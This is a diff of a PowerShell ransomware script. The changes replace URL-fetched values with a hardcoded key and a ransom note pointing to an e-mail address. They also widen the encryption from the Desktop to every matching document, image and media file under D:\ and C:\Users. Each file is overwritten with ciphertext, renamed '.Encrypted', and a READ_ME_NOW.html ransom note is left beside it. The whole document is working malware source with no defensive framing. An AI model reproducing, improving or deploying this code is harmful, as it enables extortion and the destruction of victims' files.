@@ -1,6 +1,6 @@
 $web = New-Object Net.WebClient
-$key = $web.DownloadString("https://goo.gl/drDgnJ")
-$text = $web.DownloadString("https://goo.gl/7oKo86")
+$key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvXIGeuwHQzt0XVyRBA9/bCK7j9b4celVVd5ATSr/6Ev6QiBagf+d11l71Eqhznddzgi5+hEB+j5VPJq+4EjdD7JLnVjd/kxd4xkCFjkWsjEY9Vh41kZDoB3F0z92zkwHIx/wVtJJdq6vUX1Q9TMSRjQrA+XpdotSU+2Q/lBP12QIDAQAB"
+$text = "All your files have been encrypted due to a security problem with your PC. If you want to restore them, write us to the e-mail abc@abc.cc"
 
 function Encrypt-File($String, $Passphrase)
 {
@@ -25,9 +25,23 @@ function Encrypt-File($String, $Passphrase)
     return $ms.ToArray()
 }
 
-$DesktopPath = [Environment]::GetFolderPath("Desktop")
+gci D:\ -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{
 
-gci $DesktopPath -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{
+   try{
+       $file = Get-Content $_ -raw;
+       $encrypt = Encrypt-File $file $key
+       Set-Content -Path $_ -Value $encrypt
+
+        $newname=$_.Name+'.Encrypted';
+        ren -Path $_.FullName -NewName $newname -Force;
+
+        $path=$_.DirectoryName+'\READ_ME_NOW.html';
+        sc -pat $path -va $text
+    }
+    catch{}
+}
+
+gci C:\Users -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{
 
    try{
        $file = Get-Content $_ -raw;
